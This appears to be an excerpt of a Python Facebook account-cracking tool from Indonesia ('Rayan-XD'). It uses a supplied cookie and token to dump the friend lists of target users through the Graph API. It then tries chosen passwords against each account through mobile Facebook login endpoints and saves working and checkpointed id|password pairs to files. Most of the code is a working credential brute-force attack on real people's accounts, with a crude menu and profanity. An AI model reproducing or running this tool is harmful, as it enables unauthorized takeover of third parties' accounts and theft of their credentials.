...
#MODULE
import requests,bs4,json,os,sys,random,datetime,time,re,playsound
import urllib3
try:
	import rich
except ImportError:
...
#2ps.#playsound("C:\\Users\\sunde\\Desktop\\music\\rayan.mp3")
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}RAYAN{N} " + animation[i % len(animation)] +"\x1b[0m ")
        #winsound.PlaySound("hayy", winsound.SND_FILENAME)
        sys.stdout.flush()
    print("")
#playsound("/storage/emulated/0/rayan.mp3")
# INDICATION
...
╚═══╩╝╚═╩═══╝─╚╝─╚═══╝╚╝──╚═══╝{P}
{R}╔═════════════════════════════╗
{U}Coded By : {H}Rayan-XD           
{U}Version  : {H}1.5 {P}[{M}FREE{P}]
{U}Whatsapp : {H}085852768706 
{U}Facebook : {H}Mas Rayan      
{R}╚═════════════════════════════╝''')
def banner2():
	#clear()
	print(f'''{R}
...
def login_lagi334():
	...
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	yu = '[green] 𝙆𝙀𝙏𝙄𝙆 𝙂𝙀𝙏 𝙐𝙉𝙏𝙐𝙆 𝘽𝙀𝙇𝙄 𝙁𝙄𝙇𝙀 𝘾𝙍𝘼𝘾𝙆'
	yi = nel(yu,style='')
	sol().print(yi)
	cookie=input(f'  [{H}•{P}] Masukkan Cookie :{H} ')
	...
	try:
		...
		print(f'  [{K}x{x}]{x}LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!')
		exit()
...
def menu(my_name,my_id):
	try:
		...
		print('[{M}×{x}] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner1()
	ip = requests.get("https://api.ipify.org").text
	print(f"{P}LOGIN INFO{N}")
	print(f"{R}══════════════════════════════════════════")
#	print(f"{P}LOGIN INFO{N}")
	print(f"{P} [{H}•{P}] IP   : {ip}")
	print(f"{P} [{H}•{P}] NAMA : {my_name}")
	print(f"{P} [{H}•{P}] ID   : {my_id}")
	print(f"{R}══════════════════════════════════════════")
	print(f"{P}MENU CRACK{N}")
	print(f"{R}══════════════════════════════════════════{P}")
	print(f'{R}➣{P} 1.Crack Publik')
	print(f'{R}➣{P} 2.Crack Massal')
	print(f'{R}➣{P} 3.Crack File')
	print(f'{R}➣{P} 4.Hasil Crack')
	print(f'{R}➣{P} 5.CP Detektor')
	print(f'{R}➣{P} 0.Keluar ({M}Hapus Token/Cookie{N})')
	print(f"{R}══════════════════════════════════════════{P}")
	jh=input('%s[%s?%s] Pilih : '%(N,K,N))
	if jh == '':
		jh('\n %s[%s×%s] Masukin Yang Bener Kontol...!'%(N,M,N));time.sleep(2);menu()
	#print('╚══════════════════════════════════════════════════════════════╝')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		...
		for x in titik:
			 sys.stdout.write('\r %s[%s!%s] Hapus Data Login/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
			 time.sleep(1)
		os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
		jalan('\n %s[%s✓%s] %sSukses hapus cookie/data login...'%(N,H,N,H))
...
#	print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
	pil = input(' %s[%s?%s] MASUKAN ID/USERNAME : %s'%(N,K,N,H))
	try:
		...
		print(P+'['+M+'•'+P+'] TOTAL ID TERKUMPUL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {M}TIDAK ADA KONEKSI !!{N}")
		exit()
	except KeyError:
            jalan(f' %s[%s×%s] SORRY %sID TIDAK PUBLIK/TOKEN INVALID%s'%(N,M,N,M,N));time.sleep(1);dump_publik()()
...
def multicrack():
	...
	try:
		print(f"{R}══════════════════════════════════════════{P}")
		nanya_keun = int(input(f' %s[%s?%s] JUMLAH TARGET : %s'%(N,K,N,H)))
	except:nanya_keun=100000000
	for mnh in range(nanya_keun):
		mnh +=1
		print(f"{R}══════════════════════════════════════════{P}")
		pil = input('%s[%s?%s] MASUKAN ID/USERNAME %s%s%s : %s'%(N,K,N,H,mnh,N,H))
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
			...
			jalan(f' %s[%s×%s] SORRY %sID TIDAK PUBLIK/TOKEN INVALID%s'%(N,M,N,M,N));time.sleep(1);multicrack()()
	print()
	print(P+'['+R+'➣'+P+'] TOTAL IDZ TERKUMPUL: '+str(len(id)))
	setting()
...
def result():
	...
	kayes = '[bold red][[bold white]1[bold red]][bold black] HASIL LIVE CP\n[bold red][[bold white]2[bold red]][bold black] HASIL LIVE OK\n[bold red][[bold white]00[bold red]][bold black] MENU'
	kis = nel(kayes, style='black')
	panjihitam(nel(kis, title='[bold red][[bold white]HASIL CRACK[bold red]]'))
	kz = input(N+'['+K+'➣'+N+'] PILIH : ')
	if kz in ['1','01']:
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	wl = '# METHODE CRACK AKUN'
	sol().print(mark(wl, style='red'))
	teks = '[bold white][[bold white]1[bold white]][bold white] AKUN OLD [bold white][[bold red]TIDAK DI SARANKAN[bold white]]\n[bold white][[bold white]2[bold white]][bold white] AKUN NEW [bold white][[bold green]DI SARANKAN[bold white]]\n[bold white][[bold white]3[bold white]][bold white] AKUN RANDOM [bold white][[bold green]DI SARANKAN[bold white]]'
	tak = nel(teks, style='black')
	panjihitam(nel(tak, title='[bold red][[bold white]METHODE CRACK[bold red]]'))
	hu = input(N+'[ '+M+'➣'+N+' ] PILIH : ')
	if hu in ['1','01']:
	...
	ioz = '[bold white][[bold white]01[bold white]][bold white] MOBILE FACEBOOK [bold white][[bold green]Slow[bold white]]\n[bold white][[bold white]02[bold white]][bold white] TOUCH FACEBOOK [bold white][[bold green]Fast[bold white]]\n[bold white][[bold white]03[bold white]][bold white] MBASIC FACEBOOK [bold white][[bold green]Normal[bold white]]'
	gess = nel(ioz, style='black')
	panjihitam(nel(gess, title='[bold red][[bold white]METODE LOGIN[bold red]]'))
	hc = input(N+'[ '+R+'➣'+N+' ] PILIH : ')
	if hc in ['1','01']:
	...
	pwplus = input(N+'['+R+'➣'+N+'] PILIH : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[➣] GUNAKAN COMMA UNTUK PEMISAH PASSWORD\n[➣] MAXIMAL 5 PASSWORD SAJA\n[➣] CONTOH PASSWORD : rayanxd,rayanganteng,rayanmemek'
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	ler = '# PROSES CRACK DIMULAI'
	sol().print(mark(ler, style='red'))
	krek = '        HASIL LIVE OK : OK/%s\n        HASIL LIVE CP : CP/%s\n          ON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL'%(okc,cpc)
	panjihitam(nel(krek, title='[bold red][[bold white]PROSES CRACK SEDANG BERLANGSUNG[bold red]]'))
	...
	woi = input(N+'['+M+'➣'+N+'] APAKAH INGIN CEK HASIL CRACK? [Y/t] : ')
	if woi in ['y','Y']:
		result()
	else:
		exit()
...
def crack(idf,pwv,nmf):
	...
	sys.stdout.write(f"\r {animasi} {P} LIVE RAYAN-XD[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				panjihitam(nel(cpgan, title='[bold red][[bold yellow]LIVE - CP[bold red]]'))				
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				cpngab = f'[➣] NAMA : {nmf}\n[➣] ID : {idf}\n[➣] PASSWORD : {pw}'
				cpgan = nel(cpngab, style='red')
				panjihitam(nel(cpgan, title='[bold red][[bold red]LIVE - CP[bold red]]'))
				os.popen('data/cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
